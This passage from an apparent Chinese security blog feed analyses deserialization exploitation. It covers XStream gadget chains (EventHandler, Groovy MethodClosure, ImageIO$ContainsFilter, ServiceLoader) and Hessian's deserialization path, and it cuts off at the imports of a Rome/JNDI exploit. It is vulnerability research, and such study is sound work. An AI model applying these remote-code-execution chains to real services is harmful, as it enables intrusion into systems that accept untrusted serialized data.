32);">方法，用来循环遍历子标签中的元素并添加到集合中，先将动态代理标签添加进集合中，接着调用</font><font style="color:rgb(32, 32, 32);">readItem</font><font style="color:rgb(32, 32, 32);">方法读取标签内容，成功获取到了动态代理类并添加到</font><font style="color:rgb(32, 32, 32);">Map</font><font style="color:rgb(32, 32, 32);">中缓存起来。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715326440132-3c441ed8-6f4d-4554-9414-860493274958.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715326572101-f4ec0019-0424-4895-8fb9-879ce177ae4b.png"></p><p><font style="color:rgb(32, 32, 32);">调用完</font><font style="color:rgb(32, 32, 32);">populateMap</font><font style="color:rgb(32, 32, 32);">方法后，会判断</font><font style="color:rgb(32, 32, 32);">JVM</font><font style="color:rgb(32, 32, 32);">是否已充分将</font><font style="color:rgb(32, 32, 32);">TreeMap</font><font style="color:rgb(32, 32, 32);">都缓存起来了，然后调用</font><font style="color:rgb(32, 32, 32);">TreeMap</font><font style="color:rgb(32, 32, 32);">类的</font><font style="color:rgb(32, 32, 32);">putAll</font><font style="color:rgb(32, 32, 32);">方法，可看到参数中包含动态代理类，该代理类指向</font><font style="color:rgb(32, 32, 32);">EventHandler</font><font style="color:rgb(32, 32, 32);">类，而该类正如上文介绍时说的那样通过传入</font><font style="color:rgb(32, 32, 32);">target</font><font style="color:rgb(32, 32, 32);">和</font><font style="color:rgb(32, 32, 32);">action</font><font style="color:rgb(32, 32, 32);">参数值来利用反射机制调用了</font><font style="color:rgb(32, 32, 32);">ProcessBuilder(cmd).start()</font><font style="color:rgb(32, 32, 32);">来执行任意命令。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715327281392-f31aee91-79ab-4175-8f4a-287f47962860.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715327340236-299b65c9-d453-4998-af6c-83564b47a77e.png"></p><p>由于动态代理类的机制，接着会调用到<font style="color:rgb(32, 32, 32);">EventHandler#invoke</font><font style="color:rgb(32, 32, 32);">方法，通过安全管理器获得权限来执行</font><font style="color:rgb(32, 32, 32);">EventHandler#invokeInternal</font><font style="color:rgb(32, 32, 32);">方法，在</font><font style="color:rgb(32, 32, 32);">EventHandler#invokeInternal</font><font style="color:rgb(32, 32, 32);">方法中，当获取到目标动态代理类对象的实际方法后，就直接通过反射机制调用，实现命令执行。</font></p><h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>除了上文提到的<font style="color:rgb(32, 32, 32);">EventHandler#invokeInternal</font><font style="color:rgb(32, 32, 32);">方法的反射机制调用实现命令执行，还有几种其它的利用姿势实现命令执行。</font></p><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a><font style="color:rgba(0, 0, 0, 0.87);">ConvertedClosure</font></h3><p>在Groovy 2.4.3版本之前，MethodClosure方法支持被反序列化调用，可以利用MethodClosure方法封装需要执行的对象，例如new MethodClosure(Runtime.getRuntime(), “exec”);。</p><p>ConvertedClosure方法继承了InvocationHandler，会调用父类org.codehaus.groovy.runtime.ConversionHandler的invoke方法，接着再调用ConvertedClosure#invokeCustom方法，此时属性均可控，可以去调用去调用前面构造好的MethodClosure，结合TreeSetConverter实现命令执行。</p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715394277936-feb8616e-6cb7-464f-b93e-a8ad96efa650.png"></p><h3 id="Expando"><a href="#Expando" class="headerlink" title="Expando"></a><font style="color:rgba(0, 0, 0, 0.87);">Expando</font></h3><p>在groovy.util.Expando#hashCode方法中，<font style="color:rgba(0, 0, 0, 0.87);">如果在类属性</font>expandoProperties<font style="color:rgba(0, 0, 0, 0.87);">中存在</font>hashCode:methodclosure<font style="color:rgba(0, 0, 0, 0.87);">的内容，便可以直接调用</font>MethodClosure<font style="color:rgba(0, 0, 0, 0.87);">的</font>call<font style="color:rgba(0, 0, 0, 0.87);">函数，跟上文</font>ConvertedClosure<font style="color:rgba(0, 0, 0, 0.87);">后续的调用一样，但是这里调用时没有函数参数进来，因此这里的思路可以是</font>ProcessBuilder.start<font style="color:rgba(0, 0, 0, 0.87);">或者</font><font style="color:rgba(0, 0, 0, 0.87);">fastjson</font><font style="color:rgba(0, 0, 0, 0.87);">那种</font><font style="color:rgba(0, 0, 0, 0.87);">getters</font><font style="color:rgba(0, 0, 0, 0.87);">的利用，结合</font><font style="color:rgba(0, 0, 0, 0.87);">Map</font><font style="color:rgba(0, 0, 0, 0.87);">类型触发</font><font style="color:rgba(0, 0, 0, 0.87);">hashCode</font><font style="color:rgba(0, 0, 0, 0.87);">实现命令执行。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715394806948-9461c9b7-48e5-4754-a194-7e2aa19d2ce7.png"></p><h3 id="ImageIO-ContainsFilter"><a href="#ImageIO-ContainsFilter" class="headerlink" title="ImageIO$ContainsFilter"></a>ImageIO$ContainsFilter</h3><p>在jdk.nashorn.internal.objects.NativeString#hashCode方法中会调用getStringValue方法，而getStringValue方法中的value类型为CharSequence。因此，接下来要找可以利用的CharSequence的实现类，这里用到的是com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString方法。</p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395108295-5020629f-2a53-433a-9ad5-40f67a0258c1.png"></p><p>跟进com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString方法，先调用get方法，接着<font style="color:rgba(0, 0, 0, 0.87);">会去调用</font>ByteArrayOutputStreamEx#readFrom方法<font style="color:rgba(0, 0, 0, 0.87);">。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395163947-81a924f3-5a2e-424d-9970-e56608f5c8b3.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395192558-053e2bec-d3c1-4af7-a524-9acc65a2626b.png"></p><p>跟进ByteArrayOutputStreamEx#readFrom方法，这里的is是可控的，<font style="color:rgba(0, 0, 0, 0.87);">因为这里调用的</font>this.dataHandler.getDataSource().getInputStream()<font style="color:rgba(0, 0, 0, 0.87);">，他的值传递都可以用类属性的方式把他构建出来。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. this.dataHandler == 构造好的DataHandler</span><br><span class="line">2. DataHandler的dataSource属性 == 构造好的XmlDataSource</span><br><span class="line">3. XmlDataSource调用getInputStream()函数返回构造好的inputStream</span><br><span class="line"></span><br><span class="line">// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</span><br></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.87);">用这种方法就可以获取一个可控的</font>inputStream<font style="color:rgba(0, 0, 0, 0.87);">，并且后续会继续调用</font>javax.crypto.CipherInputStream#read方法，跟进javax.crypto.CipherInputStream#read方法，调用getMoreData方法，<font style="color:rgba(0, 0, 0, 0.87);">此时需要构造一个</font>Cipher<font style="color:rgba(0, 0, 0, 0.87);">类型，并且后续调用</font>Cipher.update<font style="color:rgba(0, 0, 0, 0.87);">方法，这里可以用</font>javax.crypto.NullCipher<font style="color:rgba(0, 0, 0, 0.87);">来填充，因为最终用到的是父类</font>Cipher.update<font style="color:rgba(0, 0, 0, 0.87);">，只要不重载</font>update<font style="color:rgba(0, 0, 0, 0.87);">，其他的子类也可以。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395516180-1ab2e059-4e68-476c-b1df-ecd328374627.png"><br><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395596973-2683177b-897c-4ba9-83e2-6892a512cc58.png"></p><p>跟进Cipher#update方法，最终调用到serviceIterator#next<font style="color:rgba(0, 0, 0, 0.87);">方法。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395749077-17227f7c-0ab3-40fa-b08d-eb8cbf8dbc9b.png"></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715395863158-0f57cfc5-8bfb-47a3-a9bc-e0cac98e94ef.png"></p><p>跟进javax.imageio.spi.FilterIterator#next方法，调用advance方法。</p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715396049436-1ff0de58-dcbb-442c-86c5-cde77eb31fc2.png"></p><p>跟进advance方法，<font style="color:rgba(0, 0, 0, 0.87);">ImageIO</font><font style="color:rgba(0, 0, 0, 0.87);">存在一个有趣的</font><font style="color:rgba(0, 0, 0, 0.87);">filter</font><font style="color:rgba(0, 0, 0, 0.87);">，</font>javax.imageio.ImageIO.ContainsFilter#filter，这里调用该filter方法，跟进发现<font style="color:rgba(0, 0, 0, 0.87);">可以指定一个</font><font style="color:rgba(0, 0, 0, 0.87);">Method</font><font style="color:rgba(0, 0, 0, 0.87);">对象去</font><font style="color:rgba(0, 0, 0, 0.87);">invoke</font><font style="color:rgba(0, 0, 0, 0.87);">，利用</font><font style="color:rgba(0, 0, 0, 0.87);">Java</font><font style="color:rgba(0, 0, 0, 0.87);">反射机制了，提前构造好</font><font style="color:rgba(0, 0, 0, 0.87);">method</font><font style="color:rgba(0, 0, 0, 0.87);">对象，就可以调用任意的函数。</font></p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715396196890-929e7be9-0eec-4147-a676-fe5b78dacc80.png"></p><h3 id="ServiceFinder-LazyIterator"><a href="#ServiceFinder-LazyIterator" class="headerlink" title="ServiceFinder$LazyIterator"></a>ServiceFinder$LazyIterator</h3><p>在上文ImageIO$ContainsFilter的构造方式的核心是在于可以去触发Iterator.next，因此寻找其它触发Iterator.next的方式也可以实现命令执行的目的，这里选择java.util.ServiceLoader.LazyIterator#next方法。</p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715396405233-d5213e90-77be-43da-b65a-99442b0c5417.png"></p><p>当类属性acc为空时，会去调用nextService函数，而在该函数里面，存在Class.forName的调用，并且去实例化的classname、loader，都是类属性，属于可以控制的东西，到了这里自然而然的就想到了使用BCEL的ClassLoader来载入classname里的字节码。</p><p><img src="/2023/12/01/XStream-Deserialization-Vulnerability-Analysis/1715396511083-5d41797a-41b6-447f-b7e6-7014d2b39c7d.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>XStream的POC在官方的安全通告中都给出来了，<a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 组件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hessian</title>
      <link href="/2023/11/06/Hessian/"/>
      <url>/2023/11/06/Hessian/</url>
      
        <content type="html"><![CDATA[<h2 id="RPC介绍"><a href="#RPC介绍" class="headerlink" title="RPC介绍"></a>RPC介绍</h2><p>RPC（Remote Procedure Call，远程过程调用）是一个计算机通信协议，该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种客户端&#x2F;服务端（Client&#x2F;Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。</p><p>与RMI（Remote Method Invocation，远程方法调用）类似，RPC和RMI都能通过网络调用远程服务，但不同之处就在于它以标准的二进制格式来定义请求的信息 ( 请求的对象、方法、参数等 )，这种方式传输信息的优点之一就是跨语言及操作系统。如果涉及的软件采用<a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B"><font style="color:#3370FF;">面向对象编程</font></a>，那么远程过程调用亦可称作远程调用或远程方法调用，即RMI。因此，在面向对象编程范式下，RMI其实是RPC的一种具体实现。</p><p>RPC协议的通信过程如下：</p><ol><li>客户端调用客户端stub（client stub），这个调用是在本地，并将调用参数push到栈中</li><li>客户端stub（client stub）将这些参数包装，并通过系统调用发送到服务端机器，打包的过程叫<a href="https://zh.wikipedia.org/wiki/Marshalling_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)"><font style="color:#3370FF;">marshalling</font></a>（常见方式为XML、JSON及二进制编码）</li><li>客户端本地操作系统发送信息至服务器（可通过自定义TCP协议或HTTP传输）</li><li>服务器系统将信息传送至服务端stub（server stub）</li><li>服务端stub（server stub）解析信息，该过程叫<a href="https://zh.wikipedia.org/wiki/Unmarshalling_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)"><font style="color:#3370FF;">unmarshalling</font></a></li><li>服务端stub（server stub）调用程序，并通过类似的方式返回给客户端</li></ol><h2 id="反序列化机制"><a href="#反序列化机制" class="headerlink" title="反序列化机制"></a>反序列化机制</h2><p>在Java中，序列化能够将一个Java对象转换为一串便于传输的字节序列。而反序列化与之相反，能够从字节序列中恢复出一个对象，序列化和反序列化机制大体分为两类：</p><ul><li>基于Bean属性访问机制</li><li>基于Field机制</li></ul><h3 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h3><p>基于Bean属性访问机制有以下几类，这种机制的攻击面比基于Field机制的攻击面大，因为它们自动调用的方法以及在支持多态特性时自动调用方法比基于Field机制要多。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SnakeYAML</span><br><span class="line">jYAML</span><br><span class="line">YamlBeans</span><br><span class="line">Apache Flex BlazeDS</span><br><span class="line">Red5 IO AMF</span><br><span class="line">Jackson</span><br><span class="line">Castor</span><br><span class="line">Java XMLDecoder</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Field"><a href="#Field" class="headerlink" title="Field"></a>Field</h3><p>基于Field机制的反序列化是通过特殊的native（方法或反射）直接对Field进行赋值操作的机制，而不是通过getter、setter方式对属性赋值。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java Serialization</span><br><span class="line">Kryo</span><br><span class="line">Hessian</span><br><span class="line">json-io</span><br><span class="line">XStream</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Hessian介绍"><a href="#Hessian介绍" class="headerlink" title="Hessian介绍"></a>Hessian介绍</h2><p>Hessian是<a href="https://caucho.com/"><font style="color:#3370FF;">caucho</font></a>公司的工程项目，为了达到或超过ORMI&#x2F;Java JNI等其他跨语言&#x2F;平台调用的能力设计而出，在2004点发布1.0规范，一般称之为Hessian，并逐步迭代，在Hassian jar 3.2.0之后，采用了新的2.0版本的协议，一般称之为Hessian2。</p><p>Hessian是一种动态类型的<a href="http://hessian.caucho.com/doc/hessian-serialization.html"><font style="color:#3370FF;">二进制序列化</font></a>和 <a href="http://hessian.caucho.com/doc/hessian-ws.html"><font style="color:#3370FF;">Web 服务</font></a>协议，专为面向对象的传输而设计。Hessian协议在设计之初，重点针对几个目标：必须尽可能的快、必须尽可能紧凑、跨语言、不需要外部模式或接口定义等等。</p><p>对于这样的设计，caucho公司其实提供了两种解决方案，一个是Hession，一个是Burlap。Hession是基于二进制的实现，传输数据更小更快，而Burlap的消息是XML的，有更好的可读性，两种数据都是基于HTTP协议传输。</p><p>Hessian本身作为<a href="https://caucho.com/products/resin"><font style="color:#3370FF;">Resin</font></a>的一部分，但是它的com.caucho.hessian.client和com.caucho.hessian.server包不依赖于任何其他的Resin类，因此它也可以使用任何容器，例如Tomcat中，也可以使用在EJB中。事实上很多通讯框架都使用或支持了这个规范来序列化及反序列化类。</p><p>作为一个二进制的序列化协议，Hessian自行定义了一套自己的储存和还原数据的机制。对8种基础数据类型、3种递归类型、ref引用以及Hessian2中的内部引用映射进行了相关定义。这样的设计使得Hassian可以进行跨语言跨平台的调用。</p><p>Hessian序列化和反序列化机制的基本概念图如下：</p><p><img src="/2023/11/06/Hessian/1710172447413-535fbf81-e98a-41f6-b0a4-9247280ff1fe.png"></p><ol><li>AbstractSerializerFactory：抽象序列化器工厂，是管理和维护对应序列化&#x2F;反序列化机制的工厂，拥有getSerializer和getDeserializer方法，默认的几种实现如下<ol><li>SerializerFactory：标准的实现</li><li>ExtSerializerFactory：可以设置自定义的序列化机制，通过该Factory可以进行扩展</li><li>BeanSerializerFactory：对SerializerFactory的默认Object的序列化机制进行强制指定，指定为BeanSerializer</li><li>Serializer：序列化的接口，拥有writeObject方法</li><li>Deserializer：反序列化的接口，拥有readObject、readMap、readList等方法</li></ol></li><li>AbstractHessianInput：Hessian自定义的输入流，提供对应的read各种类型的方法</li><li>AbstractHessianOutput：Hessian自定义的输出流，提供对应的write各种类型的方法</li></ol><p>在Hessian的Serializer中，有以下几种默认实现的序列化器：</p><p><img src="/2023/11/06/Hessian/1710172447636-ed01d2c2-b875-4b4a-97ed-b5581f195fe6.png"></p><p>在Hessian的Deserializer中，有以下几种默认实现的反序列化器：</p><p><img src="/2023/11/06/Hessian/1710172447888-6d92cbef-0c2b-4900-8dc4-30750fa2e058.png"></p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>测试代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianProtocolTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String version;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> version;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVersion</span><span class="params">(String version)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.version = version;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianSerialize</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HessianProtocolTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProtocolTest</span>();</span><br><span class="line">        test.setName(<span class="string">&quot;Hessian&quot;</span>);</span><br><span class="line">        test.setVersion(<span class="string">&quot;4.0.63&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Hessian Serialize&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(test);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Hessian Serialize Length&quot;</span>);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes).length());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Hessian Deserialize&quot;</span>);</span><br><span class="line">        System.out.println((HessianProtocolTest) deserizlize(bytes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T t) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.writeObject(t);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserizlize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> hessianInput.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在hessianInput.readObject处下断点，跟进com.caucho.hessian.io.HessianInput#readObject方法，由于Hessian会将序列化的结果处理成一个Map，因此序列化结果的第一个byte恒为M，故tag的值为77。</p><p><img src="/2023/11/06/Hessian/1710302040489-b9de2f2b-aae3-41a5-961b-3ddfa5aa03d3.png"></p><p>进入case ‘M’，调用com.caucho.hessian.io.SerializerFactory#readMap方法。</p><p><img src="/2023/11/06/Hessian/1710302112537-2c5bbc13-4468-4271-95ce-8cb1b89a5ce5.png"></p><p>跟进com.caucho.hessian.io.SerializerFactory#readMap方法，调用SerializerFactory#getDeserializer方法。</p><p><img src="/2023/11/06/Hessian/1710302191596-e27b3a20-2ef8-45c4-b65f-1d343a3b1029.png"></p><p>跟进com.caucho.hessian.io.SerializerFactory#getDeserializer方法，Hessian协议使用unsafe创建类实例，经过一系列判断之后会创建一个HashMap对象作为_cachedTypeDeserializerMap的值，并将需要反序列化的类作为key存入HashMap中。</p><p><img src="/2023/11/06/Hessian/1710302672752-f563da26-7e72-40a3-b3fb-7d78744e5747.png"></p><p>跟进put方法，就是经典的调用任意类的hashCode方法或者equals方法，因此只需要找到后续Gadget的利用即可。</p><p><img src="/2023/11/06/Hessian/1710302818442-aecac122-925a-4081-9d13-ecd6f122e81c.png"></p><p><img src="/2023/11/06/Hessian/1710302850572-5b836e81-d60a-4038-9aab-667aca484810.png"></p><p><img src="/2023/11/06/Hessian/1710302924230-6c204bb7-56b1-4a69-9eed-4d284fc770c5.png"></p><p>除此之外，当_cachedTypeDeserializerMap为TreeMap时， 类比于CC4，会调用compare方法，进而调用到key的compareTo方法。</p><p><img src="/2023/11/06/Hessian/1710303065251-4994d900-ed63-4774-8f3e-2305f3812d6c.png"></p><p><img src="/2023/11/06/Hessian/1710303101020-e233ca66-3bf6-4928-96a2-939a58bcd2b7.png"></p><p>也就是说Hessian相对比原生反序列化的利用链，有几个限制：</p><ol><li>kick-off chain起始方法只能为hashCode&#x2F;equals&#x2F;compareTo方法</li><li>利用链中调用的成员变量不能为transient修饰</li><li>所有的调用不依赖类中readObject的逻辑，也不依赖getter&#x2F;setter的逻辑</li></ol><p>这几个限制也导致了很多Java原生反序列化利用链在Hessian中无法使用，甚至ysoserial中一些明明是hashCode&#x2F;equals&#x2F;compareTo触发的链子都不能直接拿来用。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><h3 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h3><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>Rome链核心是ToStringBean，这个类的toString方法会调用他封装类的全部无参getter方法，所以可以借助JdbcRowSetImpl#getDatabaseMetaData方法触发JNDI注入。但是有个坑点，要调用JdbcRowSetImpl#setMatchColumn方法设置值，不然走不到最后。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> 